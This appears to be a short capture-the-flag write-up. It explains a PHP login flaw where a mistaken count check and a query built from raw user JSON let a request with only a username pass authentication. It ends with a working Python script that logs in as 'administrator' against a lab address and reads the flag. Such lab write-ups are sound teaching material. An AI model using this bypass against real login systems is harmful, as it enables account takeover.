```
 if (!count($json_data) == 2) {
            return $this->respond("Please provide username and password", 404);
        }
```
I think Dev made some mistakes here , It should be 

```
 if (count($json_data) !== 2) {
            return $this->respond("Please provide username and password", 404);
        }
```

The Other Mistake that devs made is 
```
        $query = $db->table("users")->getWhere($json_data, 1, 0);
```
He just checked username for validation, actually he just check everything that included in $json_data but due to the mistake he made in above, it becomes a serious vulnerability
#Here is my exploit

```python
import requests
from bs4 import BeautifulSoup as bs

url = "http://94.237.62.149:54590/index.php"

def get_admin_token():
    full_path = f"{url}/login"
    headers = {"Content-Type": "application/json"}
    data = {"username" : "administrator"}
    respond = requests.post(full_path,headers=headers,json=data)
    token = respond.text.split('"')[7]
    get_flag(token)
    
def get_flag(token):
    full_path = f"{url}/profile"
    cookies = {"token":token}
    flag = requests.get(full_path,cookies=cookies)
    soup = bs(flag.content,"html5lib")
    flag = soup.find("div",attrs={"class":"home__desc"})
    flag = flag.text.strip()
    print(f"Flag is => {flag}")

if __name__ == "__main__":
    get_admin_token()
```
